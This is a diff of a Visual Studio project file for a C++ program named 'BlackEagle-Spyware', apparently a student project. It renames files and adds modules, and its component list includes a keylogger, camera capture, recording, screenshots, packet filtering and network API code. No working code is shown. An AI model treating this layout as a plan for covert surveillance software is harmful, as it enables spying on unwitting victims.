@@ -19,28 +19,31 @@
     </ProjectConfiguration>
   </ItemGroup>
   <ItemGroup>
-    <ClCompile Include="Control\camera.cpp" />
+    <ClCompile Include="Control\Camera.cpp" />
     <ClCompile Include="Control\Keylogger.cpp" />
-    <ClCompile Include="BeMain\blackeagle-spyware.cpp" />
-    <ClCompile Include="BeMain\taskManagement.cpp" />
-    <ClCompile Include="BeMain\taskRoutines.cpp" />
+    <ClCompile Include="Blackeagle-init\Blackeagle-spyware.cpp" />
+    <ClCompile Include="Blackeagle-init\TaskManagement.cpp" />
+    <ClCompile Include="Blackeagle-init\TaskRoutines.cpp" />
+    <ClCompile Include="Control\Lockdown.cpp" />
     <ClCompile Include="Control\Recorder.cpp" />
     <ClCompile Include="Control\Screenshoter.cpp" />
-    <ClCompile Include="DataManagement\converters.cpp" />
-    <ClCompile Include="DataManagement\files.cpp" />
+    <ClCompile Include="DataManagement\Converters.cpp" />
+    <ClCompile Include="DataManagement\Files.cpp" />
     <ClCompile Include="dist\jsoncpp.cpp" />
     <ClCompile Include="Filtering\ProcessPacket.cpp" />
-    <ClCompile Include="Network\Request.cpp" />
+    <ClCompile Include="Network\Connect.cpp" />
+    <ClCompile Include="Network\ApiOperations.cpp" />
   </ItemGroup>
   <ItemGroup>
-    <ClInclude Include="Control\camera.h" />
-    <ClInclude Include="Control\keylogger.h" />
-    <ClInclude Include="BeMain\taskManagement.h" />
-    <ClInclude Include="BeMain\taskRoutines.h" />
+    <ClInclude Include="Control\Camera.h" />
+    <ClInclude Include="Control\Keylogger.h" />
+    <ClInclude Include="Blackeagle-init\TaskManagement.h" />
+    <ClInclude Include="Blackeagle-init\TaskRoutines.h" />
+    <ClInclude Include="Control\Lockdown.h" />
     <ClInclude Include="Control\Recorder.h" />
     <ClInclude Include="Control\Screenshoter.h" />
-    <ClInclude Include="DataManagement\converters.h" />
-    <ClInclude Include="DataManagement\files.h" />
+    <ClInclude Include="DataManagement\Converters.h" />
+    <ClInclude Include="DataManagement\Files.h" />
     <ClInclude Include="dist\json\json-forwards.h" />
     <ClInclude Include="dist\json\json.h" />
     <ClInclude Include="Filtering\ProcessPacket.h" />
@@ -54,7 +57,8 @@
     <ClInclude Include="include\json\value.h" />
     <ClInclude Include="include\json\version.h" />
     <ClInclude Include="include\json\writer.h" />
-    <ClInclude Include="Network\Request.h" />
+    <ClInclude Include="Network\Connect.h" />
+    <ClInclude Include="Network\ApiOperations.h" />
   </ItemGroup>
   <ItemGroup>
     <None Include="data.json" />
@@ -64,6 +68,10 @@
   </ItemGroup>
   <ItemGroup>
     <Text Include="include\CMakeLists.txt" />
+    <Text Include="kl.txt" />
+  </ItemGroup>
+  <ItemGroup>
+    <Image Include="img.png" />
   </ItemGroup>
   <PropertyGroup Label="Globals">
     <VCProjectVersion>16.0</VCProjectVersion>
@@ -171,7 +179,7 @@
       <SDLCheck>true</SDLCheck>
       <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <ConformanceMode>true</ConformanceMode>
-      <AdditionalIncludeDirectories>C:\Users\לירון\Final_Project\BlackEagle-Spyware\blackeagle-spyware\include;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <AdditionalIncludeDirectories>C:\Users\ramir\Desktop\final-project\blackEagle-spyware\blackeagle-spyware\include;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
     </ClCompile>
     <Link>
       <SubSystem>Windows</SubSystem>
